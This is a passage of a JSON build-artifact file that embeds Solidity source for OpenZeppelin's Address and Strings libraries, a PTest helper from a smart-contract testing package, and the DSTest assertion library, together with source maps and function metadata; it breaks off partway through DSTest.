amount}(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    }\n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionCall(target, data, \"Address: low-level call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, 0, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value\n    ) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\n        require(isContract(target), \"Address: call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.call{value: value}(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns (bytes memory) {\n        require(isContract(target), \"Address: static call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.staticcall(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        require(isContract(target), \"Address: delegate call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.delegatecall(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns (bytes memory) {\n        if (success) {\n            return returndata;\n        } else {\n            // Look for revert reason and bubble it up if present\n            if (returndata.length > 0) {\n                // The easiest way to bubble the revert reason is using memory via assembly\n                /// @solidity memory-safe-assembly\n                assembly {\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                }\n            } else {\n                revert(errorMessage);\n            }\n        }\n    }\n}\n","sourceMap":"194:8111:10:-:0;;;;;;;;;;;;;;;-1:-1:-1;;;194:8111:10;;;;;;;;;;;;;;;;;","sourceMapDeployed":"194:8111:10:-:0;;;;;;;;","constructor":null,"functions":[],"functionalLines":[]},{"name":"Strings","artifactPath":"out/Strings.sol/Strings.json","sourcePath":"node_modules/@openzeppelin/contracts/utils/Strings.sol","contractId":"node_modules/@openzeppelin/contracts/utils/Strings.sol:Strings","sourceFileId":12,"sourceContent":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.7.0) (utils/Strings.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev String operations.\n */\nlibrary Strings {\n    bytes16 private constant _HEX_SYMBOLS = \"0123456789abcdef\";\n    uint8 private constant _ADDRESS_LENGTH = 20;\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` decimal representation.\n     */\n    function toString(uint256 value) internal pure returns (string memory) {\n        // Inspired by OraclizeAPI's implementation - MIT licence\n        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol\n\n        if (value == 0) {\n            return \"0\";\n        }\n        uint256 temp = value;\n        uint256 digits;\n        while (temp != 0) {\n            digits++;\n            temp /= 10;\n        }\n        bytes memory buffer = new bytes(digits);\n        while (value != 0) {\n            digits -= 1;\n            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));\n            value /= 10;\n        }\n        return string(buffer);\n    }\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.\n     */\n    function toHexString(uint256 value) internal pure returns (string memory) {\n        if (value == 0) {\n            return \"0x00\";\n        }\n        uint256 temp = value;\n        uint256 length = 0;\n        while (temp != 0) {\n            length++;\n            temp >>= 8;\n        }\n        return toHexString(value, length);\n    }\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\n     */\n    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {\n        bytes memory buffer = new bytes(2 * length + 2);\n        buffer[0] = \"0\";\n        buffer[1] = \"x\";\n        for (uint256 i = 2 * length + 1; i > 1; --i) {\n            buffer[i] = _HEX_SYMBOLS[value & 0xf];\n            value >>= 4;\n        }\n        require(value == 0, \"Strings: hex length insufficient\");\n        return string(buffer);\n    }\n\n    /**\n     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal representation.\n     */\n    function toHexString(address addr) internal pure returns (string memory) {\n        return toHexString(uint256(uint160(addr)), _ADDRESS_LENGTH);\n    }\n}\n","sourceMap":"161:2235:12:-:0;;;;;;;;;;;;;;;-1:-1:-1;;;161:2235:12;;;;;;;;;;;;;;;;;","sourceMapDeployed":"161:2235:12:-:0;;;;;;;;","constructor":null,"functions":[],"functionalLines":[]},{"name":"PTest","artifactPath":"out/PTest.sol/PTest.json","sourcePath":"node_modules/@pwnednomore/contracts/PTest.sol","contractId":"node_modules/@pwnednomore/contracts/PTest.sol:PTest","sourceFileId":15,"sourceContent":"// SPDX-License-Identifier: MIT\npragma solidity >=0.6.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./ScriptEx.sol\";\n\ncontract PTest is Test, ScriptEx {\n    uint256 private constant AGENT_PRIVATE_KEY =\n        uint256(keccak256(\"pnm.agent\"));\n\n    function getAgent() internal returns (address) {\n        return vm.addr(AGENT_PRIVATE_KEY);\n    }\n\n    function getAgentKey() public pure returns (uint256) {\n        return AGENT_PRIVATE_KEY;\n    }\n}\n","sourceMap":"120:329:15:-:0;;;1572:26:18;;;-1:-1:-1;;170:28:19;;;;;120:329:15;;;;;;;;;;;;;;;;","sourceMapDeployed":"120:329:15:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;590:106:16;;;;;;:::i;:::-;;:::i;:::-;;1170:107;;;;;;:::i;:::-;;:::i;321:38:19:-;;250:64;321:38;;;;;-1:-1:-1;;;;;892:32:29;;;874:51;;862:2;847:18;321:38:19;;;;;;;;884:105:16;;;;;;:::i;:::-;;:::i;1059:62::-;;;:::i;396:82::-;;;;;;:::i;:::-;;:::i;1819:584:18:-;;;:::i;:::-;;;1513:14:29;;1506:22;1488:41;;1476:2;1461:18;1819:584:18;1348:187:29;353:94:15;;;220:22;1686:25:29;;1674:2;1659:18;353:94:15;1540:177:29;798:81:16;;;;;;:::i;:::-;;:::i;170:28:19:-;;;;;;;;;;;;1572:26:18;;;;;;;;;590:106:16;667:22;;-1:-1:-1;;;667:22:16;;-1:-1:-1;;;;;1952:15:29;;;667:22:16;;;1934:34:29;2004:15;;1984:18;;;1977:43;250:64:19;;667:8:16;;1869:18:29;;667:22:16;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;590:106;;:::o;1170:107::-;1246:24;;-1:-1:-1;;;1246:24:16;;-1:-1:-1;;;;;2223:32:29;;1246:24:16;;;2205:51:29;2272:18;;;2265:34;;;250:64:19;;1246:7:16;;2178:18:29;;1246:24:16;2031:274:29;884:105:16;955:27;;-1:-1:-1;;;955:27:16;;-1:-1:-1;;;;;1952:15:29;;;955:27:16;;;1934:34:29;2004:15;;1984:18;;;1977:43;250:64:19;;955:13:16;;1869:18:29;;955:27:16;1722:304:29;1059:62:16;1100:14;;;-1:-1:-1;;;1100:14:16;;;;250:64:19;;1100:12:16;;:14;;;;;274:37:19;;1100:14:16;;;;;;;274:37:19;250:64;1100:14:16;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1059:62::o;396:82::-;457:14;;-1:-1:-1;;;457:14:16;;-1:-1:-1;;;;;892:32:29;;457:14:16;;;874:51:29;250:64:19;;457:8:16;;847:18:29;;457:14:16;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;396:82;:::o;1819:584:18:-;1853:4;1873:7;;;;;;;1869:528;;;-1:-1:-1;1903:7:18;;;;;;;;1819:584::o;1869:528::-;1941:17;2990:42;2978:55;3059:16;1980:374;;2196:43;;;1671:64;2196:43;;;2205:51:29;;;-1:-1:-1;;;2272:18:29;;;2265:34;2196:43:18;;;;;;;;;2178:18:29;;;2196:43:18;;;-1:-1:-1;;1671:64:18;;2086:175;;2135:34;;2086:175;;;:::i;:::-;;;;-1:-1:-1;;2086:175:18;;;;;;;;;;2047:232;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2020:259;;;2323:7;2312:27;;;;;;;;;;;;:::i;:::-;2297:42;;2002:352;1980:374;2374:12;1819:584;-1:-1:-1;1819:584:18:o;798:81:16:-;853:19;;-1:-1:-1;;;853:19:16;;-1:-1:-1;;;;;892:32:29;;853:19:16;;;874:51:29;250:64:19;;853:13:16;;847:18:29;;853:19:16;716:215:29;14:173;82:20;;-1:-1:-1;;;;;131:31:29;;121:42;;111:70;;177:1;174;167:12;192:260;260:6;268;321:2;309:9;300:7;296:23;292:32;289:52;;;337:1;334;327:12;289:52;360:29;379:9;360:29;:::i;:::-;350:39;;408:38;442:2;431:9;427:18;408:38;:::i;:::-;398:48;;192:260;;;;;:::o;457:254::-;525:6;533;586:2;574:9;565:7;561:23;557:32;554:52;;;602:1;599;592:12;554:52;625:29;644:9;625:29;:::i;:::-;615:39;701:2;686:18;;;;673:32;;-1:-1:-1;;;457:254:29:o;1157:186::-;1216:6;1269:2;1257:9;1248:7;1244:23;1240:32;1237:52;;;1285:1;1282;1275:12;1237:52;1308:29;1327:9;1308:29;:::i;:::-;1298:39;1157:186;-1:-1:-1;;;1157:186:29:o;2797:322::-;2838:3;2876:5;2870:12;2900:1;2910:128;2924:6;2921:1;2918:13;2910:128;;;3021:4;3006:13;;;3002:24;;2996:31;2983:11;;;2976:52;2939:12;2910:128;;;-1:-1:-1;3093:1:29;3057:16;;3082:13;;;-1:-1:-1;3057:16:29;;2797:322;-1:-1:-1;2797:322:29:o;3124:278::-;-1:-1:-1;;;;;;3309:33:29;;3297:46;;3279:3;3359:37;3393:1;3384:11;;3376:6;3359:37;:::i;:::-;3352:44;3124:278;-1:-1:-1;;;;3124:278:29:o;3407:189::-;3536:3;3561:29;3586:3;3578:6;3561:29;:::i;3601:277::-;3668:6;3721:2;3709:9;3700:7;3696:23;3692:32;3689:52;;;3737:1;3734;3727:12;3689:52;3769:9;3763:16;3822:5;3815:13;3808:21;3801:5;3798:32;3788:60;;3844:1;3841;3834:12","constructor":null,"functions":[{"id":"node_modules/@pwnednomore/contracts/PTest.sol:PTest:IS_SCRIPT()(bool)","contractId":"node_modules/@pwnednomore/contracts/PTest.sol:PTest","signature":"IS_SCRIPT():(bool)","shortSignature":"f8ccbf47","name":"IS_SCRIPT","inputs":[],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/PTest.sol:PTest:IS_TEST()(bool)","contractId":"node_modules/@pwnednomore/contracts/PTest.sol:PTest","signature":"IS_TEST():(bool)","shortSignature":"fa7626d4","name":"IS_TEST","inputs":[],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/PTest.sol:PTest:asAccountBegin(address,address)","contractId":"node_modules/@pwnednomore/contracts/PTest.sol:PTest","signature":"asAccountBegin(address,address)","shortSignature":"3eb644f6","name":"asAccountBegin","inputs":[{"name":"addr","kind":"Address","internalType":"address"},{"name":"origin","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/PTest.sol:PTest:asAccountBegin(address)","contractId":"node_modules/@pwnednomore/contracts/PTest.sol:PTest","signature":"asAccountBegin(address)","shortSignature":"d8fdc41d","name":"asAccountBegin","inputs":[{"name":"addr","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/PTest.sol:PTest:asAccountEnd()","contractId":"node_modules/@pwnednomore/contracts/PTest.sol:PTest","signature":"asAccountEnd()","shortSignature":"8667f1bb","name":"asAccountEnd","inputs":[],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/PTest.sol:PTest:asAccountForNextCall(address,address)","contractId":"node_modules/@pwnednomore/contracts/PTest.sol:PTest","signature":"asAccountForNextCall(address,address)","shortSignature":"03c70e04","name":"asAccountForNextCall","inputs":[{"name":"addr","kind":"Address","internalType":"address"},{"name":"origin","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/PTest.sol:PTest:asAccountForNextCall(address)","contractId":"node_modules/@pwnednomore/contracts/PTest.sol:PTest","signature":"asAccountForNextCall(address)","shortSignature":"9d7f502f","name":"asAccountForNextCall","inputs":[{"name":"addr","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/PTest.sol:PTest:failed()(bool)","contractId":"node_modules/@pwnednomore/contracts/PTest.sol:PTest","signature":"failed():(bool)","shortSignature":"ba414fa6","name":"failed","inputs":[],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/PTest.sol:PTest:getAgentKey()(uint256)","contractId":"node_modules/@pwnednomore/contracts/PTest.sol:PTest","signature":"getAgentKey():(uint256)","shortSignature":"ce670b30","name":"getAgentKey","inputs":[],"outputs":[{"name":"","kind":{"Uint":256},"internalType":"uint256"}],"stateMutability":"pure","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/PTest.sol:PTest:setNativeBalance(address,uint256)","contractId":"node_modules/@pwnednomore/contracts/PTest.sol:PTest","signature":"setNativeBalance(address,uint256)","shortSignature":"1c050e97","name":"setNativeBalance","inputs":[{"name":"account","kind":"Address","internalType":"address"},{"name":"amount","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/PTest.sol:PTest:vm()(address)","contractId":"node_modules/@pwnednomore/contracts/PTest.sol:PTest","signature":"vm():(address)","shortSignature":"3a768463","name":"vm","inputs":[],"outputs":[{"name":"","kind":"Address","internalType":"contract Vm"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/PTest.sol:PTest:vmEx()(address)","contractId":"node_modules/@pwnednomore/contracts/PTest.sol:PTest","signature":"vmEx():(address)","shortSignature":"905a71a9","name":"vmEx","inputs":[],"outputs":[{"name":"","kind":"Address","internalType":"contract VmEx"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false}],"functionalLines":[]},{"name":"DSTest","artifactPath":"out/test.sol/DSTest.json","sourcePath":"node_modules/@pwnednomore/contracts/lib/forge-std/lib/ds-test/src/test.sol","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/lib/ds-test/src/test.sol:DSTest","sourceFileId":18,"sourceContent":"// SPDX-License-Identifier: GPL-3.0-or-later\n\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// (at your option) any later version.\n\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n\n// You should have received a copy of the GNU General Public License\n// along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\npragma solidity >=0.5.0;\n\ncontract DSTest {\n    event log                    (string);\n    event logs                   (bytes);\n\n    event log_address            (address);\n    event log_bytes32            (bytes32);\n    event log_int                (int);\n    event log_uint               (uint);\n    event log_bytes              (bytes);\n    event log_string             (string);\n\n    event log_named_address      (string key, address val);\n    event log_named_bytes32      (string key, bytes32 val);\n    event log_named_decimal_int  (string key, int val, uint decimals);\n    event log_named_decimal_uint (string key, uint val, uint decimals);\n    event log_named_int          (string key, int val);\n    event log_named_uint         (string key, uint val);\n    event log_named_bytes        (string key, bytes val);\n    event log_named_string       (string key, string val);\n\n    bool public IS_TEST = true;\n    bool private _failed;\n\n    address constant HEVM_ADDRESS =\n        address(bytes20(uint160(uint256(keccak256('hevm cheat code')))));\n\n    modifier mayRevert() { _; }\n    modifier testopts(string memory) { _; }\n\n    function failed() public returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            bool globalFailed = false;\n            if (hasHEVMContext()) {\n                (, bytes memory retdata) = HEVM_ADDRESS.call(\n                    abi.encodePacked(\n                        bytes4(keccak256(\"load(address,bytes32)\")),\n                        abi.encode(HEVM_ADDRESS, bytes32(\"failed\"))\n                    )\n                );\n                globalFailed = abi.decode(retdata, (bool));\n            }\n            return globalFailed;\n        }\n    } \n\n    function fail() internal {\n        if (hasHEVMContext()) {\n            (bool status, ) = HEVM_ADDRESS.call(\n                abi.encodePacked(\n                    bytes4(keccak256(\"store(address,bytes32,bytes32)\")),\n                    abi.encode(HEVM_ADDRESS, bytes32(\"failed\"), bytes32(uint256(0x01)))\n                )\n            );\n            status; // Silence compiler warnings\n        }\n        _failed = true;\n    }\n\n    function hasHEVMContext() internal view returns (bool) {\n        uint256 hevmCodeSize = 0;\n        assembly {\n            hevmCodeSize := extcodesize(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D)\n        }\n        return hevmCodeSize > 0;\n    }\n\n    modifier logs_gas() {\n        uint startGas = gasleft();\n        _;\n        uint endGas = gasleft();\n        emit log_named_uint(\"gas\", startGas - endGas);\n    }\n\n    function assertTrue(bool condition) internal {\n        if (!condition) {\n            emit log(\"Error: Assertion Failed\");\n            fail();\n        }\n    }\n\n    function assertTrue(bool condition, string memory err) internal {\n        if (!condition) {\n            emit log_named_string(\"Error\", err);\n            assertTrue(condition);\n        }\n    }\n\n    function assertEq(address a, address b) internal {\n        if (a != b) {\n            emit log(\"Error: a == b not satisfied [address]\");\n            emit log_named_address(\"  Expected\", b);\n            emit log_named_address(\"    Actual\", a);\n            fail();\n        }\n    }\n    function assertEq(address a, address b, string memory err) internal {\n        if (a != b) {\n            emit log_named_string (\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n    function assertEq(bytes32 a, bytes32 b) internal {\n        if (a != b) {\n            emit log(\"Error: a == b not satisfied [bytes32]\");\n            emit log_named_bytes32(\"  Expected\", b);\n            emit log_named_bytes32(\"    Actual\", a);\n            fail();\n        }\n    }\n    function assertEq(bytes32 a, bytes32 b, string memory err) internal {\n        if (a != b) {\n            emit log_named_string (\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n    function assertEq32(bytes32 a, bytes32 b) internal {\n        assertEq(a, b);\n    }\n    function assertEq32(bytes32 a, bytes32 b, string memory err) internal {\n        assertEq(a, b, err);\n    }\n\n    function assertEq(int a, int b) internal {\n        if (a != b) {\n            emit log(\"Error: a == b not satisfied [int]\");\n            emit log_named_int(\"  Expected\", b);\n            emit log_named_int(\"    Actual\", a);\n            fail();\n        }\n    }\n    function assertEq(int a, int b, string memory err) internal {\n        if (a != b) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n    function assertEq(uint a, uint b) internal {\n        if (a != b) {\n            emit log(\"Error: a == b not satisfied [uint]\");\n            emit log_named_uint(\"  Expected\", b);\n            emit log_named_uint(\"    Actual\", a);\n            fail();\n        }\n    }\n    function assertEq(uint a, uint b, string memory err) internal {\n        if (a != b) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n    function assertEqDecimal(int a, int b, uint decimals) internal {\n        if (a != b) {\n            emit log(\"Error: a == b not satisfied [decimal int]\");\n            emit log_named_decimal_int(\"  Expected\", b, decimals);\n            emit log_named_decimal_int(\"    Actual\", a, decimals);\n            fail();\n        }\n    }\n    function assertEqDecimal(int a, int b, uint decimals, string memory err) internal {\n        if (a != b) {\n            emit log_named_string(\"Error\", err);\n            assertEqDecimal(a, b, decimals);\n        }\n    }\n    function assertEqDecimal(uint a, uint b, uint decimals) internal {\n        if (a != b) {\n            emit log(\"Error: a == b not satisfied [decimal uint]\");\n            emit log_named_decimal_uint(\"  Expected\", b, decimals);\n            emit log_named_decimal_uint(\"    Actual\", a, decimals);\n            fail();\n        }\n    }\n    function assertEqDecimal(uint a, uint b, uint decimals, string memory err) internal {\n        if (a != b) {\n            emit log_named_string(\"Error\", err);\n            assertEqDecimal(a, b, decimals);\n        }\n    }\n\n    function assertGt(uint a, uint b) internal {\n        if (a <= b) {\n            emit log(\"Error: a > b not satisfied [uint]\");\n            emit log_named_uint(\"  Value a\", a);\n            emit log_named_uint(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertGt(uint a, uint b, string memory err) internal {\n        if (a <= b) {\n            emit log_named_string(\"Error\", err);\n            assertGt(a, b);\n        }\n    }\n    function assertGt(int a, int b) internal {\n        if (a <= b) {\n            emit log(\"Error: a > b not satisfied [int]\");\n            emit log_named_int(\"  Value a\", a);\n            emit log_named_int(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertGt(int a, int b, string memory err) internal {\n        if (a <= b) {\n            emit log_named_string(\"Error\", err);\n            assertGt(a, b);\n        }\n    }\n    function assertGtDecimal(int a, int b, uint decimals) internal {\n        if (a <= b) {\n            emit log(\"Error: a > b not satisfied [decimal int]\");\n            emit log_named_decimal_int(\"  Value a\", a, decimals);\n            emit log_named_decimal_int(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertGtDecimal(int a, int b, uint decimals, string memory err) internal {\n        if (a <= b) {\n            emit log_named_string(\"Error\", err);\n            assertGtDecimal(a, b, decimals);\n        }\n    }\n    function assertGtDecimal(uint a, uint b, uint decimals) internal {\n        if (a <= b) {\n            emit log(\"Error: a > b not satisfied [decimal uint]\");\n            emit log_named_decimal_uint(\"  Value a\", a, decimals);\n            emit log_named_decimal_uint(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertGtDecimal(uint a, uint b, uint decimals, string memory err) internal {\n        if (a <= b) {\n            emit log_named_string(\"Error\", err);\n            assertGtDecimal(a, b, decimals);\n        }\n    }\n\n    function assertGe(uint a, uint b) internal {\n        if (a < b) {\n            emit log(\"Error: a >= b not satisfied [uint]\");\n            emit log_named_uint(\"  Value a\", a);\n            emit log_named_uint(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertGe(uint a, uint b, string memory err) internal {\n        if (a < b) {\n            emit log_named_string(\"Error\", err);\n            assertGe(a, b);\n        }\n    }\n    function assertGe(int a, int b) internal {\n        if (a < b) {\n            emit log(\"Error: a >= b not satisfied [int]\");\n            emit log_named_int(\"  Value a\", a);\n            emit log_named_int(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertGe(int a, int b, string memory err) internal {\n        if (a < b) {\n            emit log_named_string(\"Error\", err);\n            assertGe(a, b);\n        }\n    }\n    function assertGeDecimal(int a, int b, uint decimals) internal {\n        if (a < b) {\n            emit log(\"Error: a >= b not satisfied [decimal int]\");\n            emit log_named_decimal_int(\"  Value a\", a, decimals);\n            emit log_named_decimal_int(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertGeDecimal(int a, int b, uint decimals, string memory err) internal {\n        if (a < b) {\n            emit log_named_string(\"Error\", err);\n            assertGeDecimal(a, b, decimals);\n        }\n    }\n    function assertGeDecimal(uint a, uint b, uint decimals) internal {\n        if (a < b) {\n            emit log(\"Error: a >= b not satisfied [decimal uint]\");\n            emit log_named_decimal_uint(\"  Value a\", a, decimals);\n            emit log_named_decimal_uint(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertGeDecimal(uint a, uint b, uint decimals, string memory err) internal {\n        if (a < b) {\n            emit log_named_string(\"Error\", err);\n            assertGeDecimal(a, b, decimals);\n        }\n    }\n\n    function assertLt(uint a, uint b) internal {\n        if (a >= b) {\n            emit log(\"Error: a < b not satisfied [uint]\");\n            emit log_named_uint(\"  Value a\", a);\n            emit log_named_uint(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertLt(uint a, uint b, string memory err) internal {\n        if (a >= b) {\n            emit log_named_string(\"Error\", err);\n            assertLt(a, b);\n        }\n    }\n    function assertLt(int a, int b) internal {\n        if (a >= b) {\n            emit log(\"Error: a < b not satisfied [int]\");\n            emit log_named_int(\"  Value a\", a);\n            emit log_named_int(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertLt(int a, int b, string memory err) internal {\n        if (a >= b) {\n            emit log_named_string(\"Error\", err);\n            assertLt(a, b);\n        }\n    }\n    function assertLtDecimal(int a, int b, uint decimals) internal {\n        if (a >= b) {\n            emit log(\"Error: a < b not satisfied [decimal int]\");\n            emit log_named_decimal_int(\"  Value a\", a, decimals);\n            emit log_named_decimal_int(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertLtDecimal(int a, int b, uint decimals, string memory err) internal {\n        if (a >= b) {\n            emit log_named_string(\"Error\", err);\n            assertLtDecimal(a, b, decimals);\n        }\n    }\n    function assertLtDecimal(uint a, uint b, uint decimals) internal {\n        if (a >= b) {\n            emit log(\"Error: a < b not satisfied [decimal uint]\");\n            emit log_named_decimal_uint(\"  Value a\", a, decimals);\n            emit log_named_decimal_uint(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertLtDecimal(uint a, uint b, uint decimals, string memory err) internal {\n        if (a >= b) {\n            emit log_named_string(\"Error\", err);\n            assertLtDecimal(a, b, decimals);\n        }\n    }\n\n    function assertLe(uint a, uint b) internal {\n        if (a > b) {\n            emit log(\"Error: a <= b not satisfied [uint]\");\n            emit log_named_uint(\"  Value a\", a);\n            emit log_named_uint(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertLe(uint a, uint b, string memory err) internal {\n        if (a > b) {\n            emit log_named_string(\"Error\", err);\n            assertLe(a, b);\n        }\n    }\n    function assertLe(int a, int b) internal {\n        if (a > b) {\n            emit log(\"Error: a <= b not satisfied [int]\");\n            emit log_named_int(\"  Value a\", a);\n            emit log_named_int(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertLe(int a, int b, string memory err) internal {\n        if (a > b) {\n            emit log_named_string(\"Error\", err);\n            assertLe(a, b);\n        }\n    }\n    function assertLeDecimal(int a, int b, uint decimals) internal {\n        if (a > b) {\n            emit log(\"Error: a <= b not satisfied [decimal int]\");\n            emit log_named_decimal_int(\"  Value a\", a, decimals);\n            emit log_named_decimal_int(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertLeDecimal(int a, int b, uint decimals, string memory err) internal {\n        if (a > b) {\n            emit log_named_string(\"Error\", err);\n            assertLeDecimal(a, b, decimals);\n        }\n    }\n    function 